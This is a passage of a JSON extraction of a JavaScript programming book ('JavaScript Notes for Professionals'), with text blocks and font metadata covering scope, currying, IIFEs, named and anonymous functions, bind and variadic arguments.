        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.8: Break and continue labels",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Break and continue statements can be followed by an optional label which works like some kind of a goto statement, resumes execution from the label referenced position",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for ( var  i  =   0 ;  i  <   5 ;  i ++){   nextLoop2Iteration :    for ( var  j  =   0 ;  j  <   5 ;  j ++){      if ( i  ==  j )   break  nextLoop2Iteration ;     console. log ( i ,  j );    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 162 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "i=0 j=0 skips rest of j values 1 0 i=1 j=1 skips rest of j values 2 0 2 1  i=2 j=2 skips rest of j values 3 0 3 1 3 2 i=3 j=3 skips rest of j values 4 0 4 1 4 2 4 3 i=4 j=4 does not log and loops are done",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 163",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 19: Functions",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Functions in JavaScript provide organized, reusable code to perform a set of actions. Functions simplify the coding process, prevent redundant logic, and make code easier to follow. This topic describes the declaration and utilization of functions, arguments, parameters, return statements and scope in JavaScript.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.1: Function Scoping",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When you de\ufb01ne a function, it creates a  scope . Everything de\ufb01ned within the function is not accessible by code outside the function. Only code within this scope can see the entities de\ufb01ned inside the scope.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  a  =   'hello' ;   console. log ( a );    // => 'hello' }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( a );    // reference error",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Nested functions are possible in JavaScript and the same rules apply.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  a  =   'hello' ;      function  bar ()   {      var  b  =   'world' ;     console. log ( a );    // => 'hello'     console. log ( b );    // => 'world'    }   console. log ( a );    // => 'hello'   console. log ( b );    // reference error }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( a );    // reference error console. log ( b );    // reference error",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When JavaScript tries to resolve a reference or variable, it starts looking for it in the current scope. If it cannot \ufb01nd that declaration in the current scope, it climbs up one scope to look for it. This process repeats until the declaration has been found. If the JavaScript parser reaches the global scope and still cannot \ufb01nd the reference, a reference error will be thrown.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   'hello' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  b  =   'world' ;    function  bar ()   {      var  c  =   '!!' ;     console. log ( a );    // => 'hello'     console. log ( b );    // => 'world'     console. log ( c );    // => '!!'     console. log ( d );    // reference error    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 164 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This climbing behavior can also mean that one reference may \"shadow\" over a similarly named reference in the outer scope since it gets seen \ufb01rst.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   'hello' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  a  =   'world' ;    function  bar ()   {     console. log ( a );    // => 'world'    } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "The way JavaScript resolves scoping also applies to the  const  keyword. Declaring a variable with the  const  keyword implies that you are not allowed to reassign the value, but declaring it in a function will create a new scope and with that a new variable.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ()   {    const  a  =   true ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   function  bar ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     const  a  =   false ;    // different variable",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( a );     // false    }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   const  a  =   false ;      // SyntaxError",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  a  =   false ;            // TypeError   console. log ( a );       // true }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, functions are not the only blocks that create a scope (if you are using  let  or  const ).  let  and  const declarations have a scope of the nearest block statement. See here for a more detailed description.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.2: Currying",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Currying  is the transformation of a function of  n  arity or arguments into a sequence of  n  functions taking only one argument. Use cases: When the values of some arguments are available before others, you can use currying to decompose a function into a series of functions that complete the work in stages, as each value arrives. This can be useful: When the value of an argument almost never changes (e.g., a conversion factor), but you need to maintain the \ufb02exibility of setting that value (rather than hard-coding it as a constant). When the result of a curried function is useful before the other curried functions have run. To validate the arrival of the functions in a speci\ufb01c sequence. For example, the volume of a rectangular prism can be explained by a function of three factors: length ( l ), width ( w ), and height ( h ):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  prism  =   function ( l ,  w ,  h )   {      return  l  *  w  *  h ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 165",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A curried version of this function would look like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  prism ( l )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   function ( w )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   function ( h )   {              return  l  *  w  *  h ;          }      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "// alternatively, with concise ECMAScript 6+ syntax:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  prism  =  l  =>  w  =>  h  =>  l  *  w  *  h ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can call these sequence of functions with  prism ( 2 )( 3 )( 5 ) , which should evaluate to 30. Without some extra machinery (like with libraries), currying is of limited syntactical \ufb02exibility in JavaScript (ES 5/6) due to the lack of placeholder values; thus, while you can use  var  a  =  prism ( 2 )( 3 )  to create a  partially applied function , you cannot use  prism ()( 3 )( 5 ) .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.3: Immediately Invoked Function Expressions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Sometimes you don't want to have your function accessible/stored as a variable. You can create an Immediately Invoked Function Expression (IIFE for short). These are essentially  self-executing anonymous functions . They have access to the surrounding scope, but the function itself and any internal variables will be inaccessible from outside. An important thing to note about IIFE is that even if you name your function, IIFE are not hoisted like standard functions are and cannot be called by the function name they are declared with.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   alert ( \"I've run - but can't be run again because I'm immediately invoked at runtime,           leaving behind only the result I generate\" ); }());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This is another way to write IIFE. Notice that the closing parenthesis before the semicolon was moved and placed right after the closing curly bracket:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   alert ( \"This is IIFE too.\" ); })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can easily pass parameters into an IIFE:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function ( message )   {    alert ( message ); }( \"Hello World!\" ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Additionally, you can return values to the surrounding scope:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  example  =   ( function ()   {     return   42 ; }()); console. log ( example );   // => 42",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If required it is possible to name an IIFE. While less often seen, this pattern has several advantages, such as providing a reference which can be used for a recursion and can make debugging simpler as the name is included in the callstack.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 166",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function  namedIIFE ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     throw  error ;   // We can now see the error thrown in 'namedIIFE()'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "}());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "While wrapping a function in parenthesis is the most common way to denote to the JavaScript parser to expect an expression, in places where an expression is already expected, the notation can be made more concise:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   function ()   {   return   42   }(); console. log ( a )    // => 42",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Arrow version of immediately invoked function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "(()   =>  console. log ( \"Hello!\" ))();   // => Hello!",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.4: Named Functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Functions can either be named or unnamed (anonymous functions):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  namedSum  =   function  sum  ( a ,  b )   {   // named      return  a  +  b ; } var  anonSum  =   function   ( a ,  b )   {   // anonymous      return  a  +  b ; } namedSum ( 1 ,   3 ); anonSum ( 1 ,   3 ); 4 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But their names are private to their own scope:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  sumTwoNumbers  =   function  sum  ( a ,  b )   {      return  a  +  b ; } sum ( 1 ,   3 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Uncaught ReferenceError: sum is not de\ufb01ned Named functions di\ufb00er from the anonymous functions in multiple scenarios: When you are debugging, the name of the function will appear in the error/stack trace Named functions are hoisted while anonymous functions are not Named functions and anonymous functions behave di\ufb00erently when handling recursion Depending on ECMAScript version, named and anonymous functions may treat the function  name  property di\ufb00erently",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Named functions are hoisted",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 167",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When using an anonymous function, the function can only be called after the line of declaration, whereas a named function can be called before declaration. Consider",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  foo  =   function   ()   {   // using an anonymous function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( 'bar' ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Uncaught TypeError: foo is not a function",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo  ()   {   // using a named function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( 'bar' ); } bar",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Named Functions in a recursive scenario",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A recursive function can be de\ufb01ned as:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  say  =   function   ( times )   {      if   ( times  >   0 )   {         console. log ( 'Hello!' );         say ( times  -   1 );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//you could call 'say' directly, //but this way just illustrates the example",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  sayHelloTimes  =  say ; sayHelloTimes ( 2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Hello! Hello! What if somewhere in your code the original function binding gets rede\ufb01ned?",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  say  =   function   ( times )   {      if   ( times  >   0 )   {         console. log ( 'Hello!' );         say ( times  -   1 );      } } var  sayHelloTimes  =  say ; say  =   \"oops\" ; sayHelloTimes ( 2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 168",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Hello! Uncaught TypeError: say is not a function This can be solved using a named function",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// The outer variable can even have the same name as the function // as they are contained in different scopes",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  say  =   function  say  ( times )   {      if   ( times  >   0 )   {         console. log ( 'Hello!' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // this time, 'say' doesn't use the outer variable          // it uses the named function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        say ( times  -   1 );      } } var  sayHelloTimes  =  say ; say  =   \"oops\" ; sayHelloTimes ( 2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Hello! Hello! And as bonus, the named function can't be set to  undefined , even from inside:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  say  =   function  say  ( times )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // this does nothing",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    say  =   undefined ;          if   ( times  >   0 )   {         console. log ( 'Hello!' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // this time, 'say' doesn't use the outer variable          // it's using the named function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        say ( times  -   1 );      } } var  sayHelloTimes  =  say ; say  =   \"oops\" ; sayHelloTimes ( 2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Hello! Hello!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  name  property of functions",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Before ES6, named functions had their  name  properties set to their function names, and anonymous functions had their  name  properties set to the empty string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 169",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2264 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  foo  =   function   ()   {} console. log ( foo. name );   // outputs '' function  foo  ()   {} console. log ( foo. name );   // outputs 'foo'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Post ES6, named and unnamed functions both set their  name  properties:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  foo  =   function   ()   {} console. log ( foo. name );   // outputs 'foo' function  foo  ()   {} console. log ( foo. name );   // outputs 'foo' var  foo  =   function  bar  ()   {} console. log ( foo. name );   // outputs 'bar'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.5: Binding `this` and arguments",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "When you take a reference to a method (a property which is a function) in JavaScript, it usually doesn't remember the object it was originally attached to. If the method needs to refer to that object as  this  it won't be able to, and calling it will probably cause a crash. You can use the  . bind ()  method on a function to create a wrapper that includes the value of  this  and any number of leading arguments.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  monitor  =   {   threshold :   5 ,   check :   function ( value )   {      if   ( value  >   this . threshold )   {        this . display ( \"Value is too high!\" );      }    },   display ( message )   {     alert ( message );    } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "monitor. check ( 7 );   // The value of `this` is implied by the method call syntax.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  badCheck  =  monitor. check ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "badCheck ( 15 );   // The value of `this` is window object and this.threshold is undefined, so value > this.threshold is false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  check  =  monitor. check . bind ( monitor );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "check ( 15 );   // This value of `this` was explicitly bound, the function works.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  check8  =  monitor. check . bind ( monitor ,   8 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "check8 ();   // We also bound the argument to `8` here. It can't be re-specified.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When not in strict mode, a function uses the global object ( window  in the browser) as  this , unless the function is called as a method, bound, or called with the method  . call  syntax.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. x   =   12 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 170",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  example ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   this . x ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( example ());   // 12",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In strict mode  this  is  undefined  by default",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. x   =   12 ;     function  example ()   {    \"use strict\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   this . x ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( example ());   // Uncaught TypeError: Cannot read property 'x' of undefined( \u2026 )",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 7",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Bind Operator",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The double colon  bind operator  can be used as a shortened syntax for the concept explained above:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  log  =  console. log . bind ( console );   // long version const  log  =   :: console. log ;   // short version foo. bar . call ( foo );   // long version",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo :: bar ();   // short version",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo. bar . call ( foo ,  arg1 ,  arg2 ,  arg3 );   // long version foo :: bar ( arg1 ,  arg2 ,  arg3 );   // short version foo. bar . apply ( foo ,  args );   // long version foo :: bar ( ... args );   // short version",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This syntax allows you to write normally, without worrying about binding  this  everywhere.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Binding console functions to variables",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  log  =  console. log . bind ( console );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Usage:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "log ( 'one' ,   '2' ,   3 ,   [ 4 ],   { 5 :   5 });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Output:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "one  2   3   [ 4 ]  Object  { 5 :   5 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Why would you do that?",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "One use case can be when you have custom logger and you want to decide on runtime which one to use.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  logger  =  require ( 'appLogger' ); var  log  =  logToServer  ?  logger. log   :  console. log . bind ( console );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 171",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.6: Functions with an Unknown Number of Arguments (variadic functions)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To create a function which accepts an undetermined number of arguments, there are two methods depending on your environment.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2264 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Whenever a function is called, it has an Array-like  arguments  object in its scope, containing all the arguments passed to the function. Indexing into or iterating over this will give access to the arguments, for example",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  logSomeThings ()   {      for   ( var  i  =   0 ;  i  <  arguments. length ;   ++ i )   {         console. log ( arguments [ i ]);      } } logSomeThings ( 'hello' ,   'world' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// logs \"hello\" // logs \"world\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that you can convert  arguments  to an actual Array if need-be; see: Converting Array-like Objects to Arrays",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "From ES6, the function can be declared with its last parameter using the  rest operator  ( ... ). This creates an Array which holds the arguments from that point onwards",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  personLogsSomeThings ( person ,  ... msg )   {    msg. forEach ( arg  =>   {        console. log ( person ,   'says' ,  arg );     }); } personLogsSomeThings ( 'John' ,   'hello' ,   'world' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// logs \"John says hello\" // logs \"John says world\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Functions can also be called with similar way, the  spread syntax",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  logArguments  =   ( ... args )   =>  console. log ( args ) const  list  =   [ 1 ,   2 ,   3 ] logArguments ( 'a' ,   'b' ,   'c' ,  ... list )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// output: Array [ \"a\", \"b\", \"c\", 1, 2, 3 ]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This syntax can be used to insert arbitrary number of arguments to any position, and can be used with any iterable( apply  accepts only array-like objects).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  logArguments  =   ( ... args )   =>  console. log ( args ) function *  generateNumbers ()   {   yield  6   yield  5   yield  4 } logArguments ( 'a' ,  ... generateNumbers (),  ... 'pqr' ,   'b' )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// output: Array [ \"a\", 6, 5, 4, \"p\", \"q\", \"r\", \"b\" ]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 172",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.7: Anonymous Function",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "De\ufb01ning an Anonymous Function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When a function is de\ufb01ned, you often give it a name and then invoke it using that name, like so:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo (){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // ... }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When you de\ufb01ne a function this way, the JavaScript runtime stores your function in memory and then creates a reference to that function, using the name you've assigned it. That name is then accessible within the current scope. This can be a very convenient way to create a function, but JavaScript does not require you to assign a name to a function. The following is also perfectly legal:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // ... }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When a function is de\ufb01ned without a name, it's known as an anonymous function. The function is stored in memory, but the runtime doesn't automatically create a reference to it for you. At \ufb01rst glance, it may appear as if such a thing would have no use, but there are several scenarios where anonymous functions are very convenient.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Assigning an Anonymous Function to a Variable",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A very common use of anonymous functions is to assign them to a variable:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  foo  =   function (){   /*...*/   }; foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This use of anonymous functions is covered in more detail in Functions as a variable",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Supplying an Anonymous Function as a Parameter to Another Function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
